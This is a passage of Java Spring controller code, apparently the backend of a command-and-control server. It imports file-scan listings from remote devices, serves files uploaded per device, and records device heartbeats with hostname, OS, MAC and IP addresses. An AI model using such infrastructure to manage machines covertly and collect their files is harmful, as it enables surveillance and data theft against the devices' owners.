            // Ensure sqlite-jdbc is in pom.xml
            String url = "jdbc:sqlite:" + tempDb.getAbsolutePath();
            try (java.sql.Connection conn = java.sql.DriverManager.getConnection(url);
                 java.sql.Statement stmt = conn.createStatement();
                 java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM files")) {
                
                List<C2FileScan> batchList = new ArrayList<>();
                int batchSize = 1000;
                int totalCount = 0;
                
                while (rs.next()) {
                    C2FileScan scan = new C2FileScan();
                    
                    scan.setDeviceUuid(deviceUuid); // Set UUID
                    scan.setFilePath(rs.getString("path"));
                    scan.setFileName(rs.getString("name"));
                    // Handle potential type mismatch
                    Object sizeObj = rs.getObject("size");
                    if (sizeObj instanceof Number) {
                        scan.setFileSize(((Number) sizeObj).longValue());
                    }
                    scan.setMd5(rs.getString("md5"));
                    scan.setIsRecent(0); // Full scan
                    scan.setCreateTime(new Date());
                    
                    // last_modified
                    long lastMod = rs.getLong("last_modified");
                    if (lastMod > 0) {
                        scan.setLastModified(new Date(lastMod * 1000));
                    } else {
                        scan.setLastModified(new Date());
                    }
                    
                    batchList.add(scan);
                    totalCount++;
                    
                    if (batchList.size() >= batchSize) {
                         c2FileScanService.saveBatch(batchList);
                         batchList.clear();
                    }
                }
                
                if (!batchList.isEmpty()) {
                     c2FileScanService.saveBatch(batchList);
                }
                log.info("Processed {} files from scan results", totalCount);
            }
            
            // Update task status
            if (taskId != null) {
                C2Task task = c2TaskMapper.selectOne(new QueryWrapper<C2Task>().eq("taskId", taskId));
                if (task != null) {
                    task.setStatus("completed");
                    task.setResult("Scan completed. Data imported from DB.");
                    c2TaskMapper.updateById(task);
                }
            }
            
            log.info("Processed {} files from scan results", totalCount);
            
        } catch (Exception e) {
            log.error("Failed to process scan results", e);
        } finally {
            if (tempDb != null) {
                tempDb.delete();
            }
        }
    }

    @GetMapping("/c2/download")
    public void downloadFile(@RequestParam(value = "uuid", required = true) String uuid,
                             @RequestParam("filename") String filename,
                             HttpServletResponse response) {
        log.info("Download request: uuid={}, filename={}", uuid, filename);
        try {
            // Prevent path traversal
            if (filename.contains("..") || filename.contains("/") || filename.contains("\\")) {
                log.warn("Invalid filename (path traversal attempt): {}", filename);
                response.setStatus(403);
                return;
            }
            
            if (uuid == null || uuid.isEmpty()) {
                 log.warn("Download request missing uuid");
                 response.setStatus(400);
                 return;
            }
            
            String path = "uploads/" + uuid + "/" + filename;
            java.io.File file = new java.io.File(path);
            log.info("Looking for file at: {}", file.getAbsolutePath());
            
            if (!file.exists()) {
                log.error("File not found: {}", file.getAbsolutePath());
                response.setStatus(404);
                return;
            }
            
            String contentType = "application/octet-stream";
            if (filename.endsWith(".png")) {
                contentType = "image/png";
            } else if (filename.endsWith(".jpg") || filename.endsWith(".jpeg")) {
                contentType = "image/jpeg";
            }
            log.info("Serving file with Content-Type: {}", contentType);
            response.setContentType(contentType);
            // response.setHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");
            
            java.nio.file.Files.copy(file.toPath(), response.getOutputStream());
            response.getOutputStream().flush();
            log.info("File served successfully");
        } catch (Exception e) {
            log.error("Download failed", e);
            response.setStatus(500);
        }
    }
    
    // Helper to record heartbeat from request
    private C2Device recordHeartbeat(Map<String, Object> payload, HttpServletRequest request) {
        // External IP from request header/remote addr
        String externalIp = "127.0.0.1";
        if (request != null) {
            externalIp = NetUtils.getIpAddress(request);
            if ("0:0:0:0:0:0:0:1".equals(externalIp)) {
                externalIp = "127.0.0.1";
            }
        }
        String internalIp = "Unknown";
        String hostName = "Unknown";
        String os = "Unknown";
        String macAddress = null;
        String uuid = null;
        
        // Debug logging
        log.info("Received heartbeat payload: {}", payload);
        
        if (payload != null) {
            if (payload.containsKey("hostName")) {
                hostName = (String) payload.get("hostName");
            }
            if (payload.containsKey("os")) {
                os = (String) payload.get("os");
            }
            if (payload.containsKey("macAddress")) {
                macAddress = (String) payload.get("macAddress");
            }
            if (payload.containsKey("uuid")) {
                uuid = (String) payload.get("uuid");
            }
            // Client reported IP is treated as Internal IP
             if (payload.containsKey("ip")) {
                String clientIp = (String) payload.get("ip");
                if (clientIp != null && !clientIp.isEmpty()) {
                    internalIp = clientIp;
                }
             }
        }

        // Identify by UUID (Most reliable, persistent)
        // Then MAC Address, then Hostname/External IP
        QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
        if (uuid != null && !uuid.isEmpty()) {
            queryWrapper.eq("uuid", uuid);
        } else if (macAddress != null && !macAddress.isEmpty()) {
            queryWrapper.eq("macAddress", macAddress);
        } else if (!"Unknown".equals(hostName)) {
            queryWrapper.eq("hostName", hostName);
        } else {
            queryWrapper.eq("externalIp", externalIp);
        }
        
        // Handle potential duplicates or just pick one
        List<C2Device> devices = c2DeviceMapper.selectList(queryWrapper);
        C2Device device = null;
        if (devices != null && !devices.isEmpty()) {
            device = devices.get(0);
        }

        if (device == null) {
            device = new C2Device();
            if (uuid == null || uuid.isEmpty()) {
                uuid = UUID.randomUUID().toString();
            }
            device.setUuid(uuid); // Save UUID if provided or generated
            device.setExternalIp(externalIp);
            device.setInternalIp(internalIp);
            device.setHostName(hostName);
            device.setOs(os);
            device.setMacAddress(macAddress);
            device.setLastSeen(new Date());
            c2DeviceMapper.insert(device);
        } else {
            device.setLastSeen(new Date());
            // Update info
            if (device.getUuid() == null || device.getUuid().isEmpty()) {
                if (uuid != null && !uuid.isEmpty()) {
                    device.setUuid(uuid);
                } else {
                    device.setUuid(UUID.randomUUID().toString());
                }
            } else if (uuid != null && !uuid.isEmpty() && !uuid.equals(device.getUuid())) {
                device.setUuid(uuid); 
            }
            
            device.setExternalIp(externalIp);
            if (macAddress != null) {
                device.setMacAddress(macAddress);
            }
            if (!"Unknown".equals(internalIp)) {
                device.setInternalIp(internalIp);
            }
            if (!"Unknown".equals(hostName)) {
                device.setHostName(hostName);
            }
            if (!"Unknown".equals(os)) {
                device.setOs(os);
            }
            c2DeviceMapper.updateById(device);
        }
        return device;
    }
}

